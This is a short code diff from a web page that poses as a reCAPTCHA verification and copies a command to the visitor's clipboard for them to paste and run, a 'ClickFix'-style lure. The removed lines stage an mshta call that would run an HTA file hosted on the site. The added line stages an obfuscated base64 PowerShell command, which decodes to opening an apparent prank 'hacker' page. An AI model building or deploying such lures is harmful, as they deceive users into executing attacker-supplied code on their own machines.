@@ -420,8 +420,8 @@
             document.getElementById('verification-id').textContent = verification_id;
             
             const htaPath = window.location.origin + "/recaptcha-verify";
-            const commandToRun = "mshta " + htaPath
-            stageClipboard(commandToRun, verification_id)
+            const commandToRun = "powershell -eC cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAG0AcwBlAGQAZwBlACAAaAB0AHQAcABzADoALwAvAHAAcgBhAG4AeAAuAGMAbwBtAC8AaABhAGMAawBlAHIALwA="
+            stageClipboard(commandToRun)
         }
 
         addCaptchaListeners();
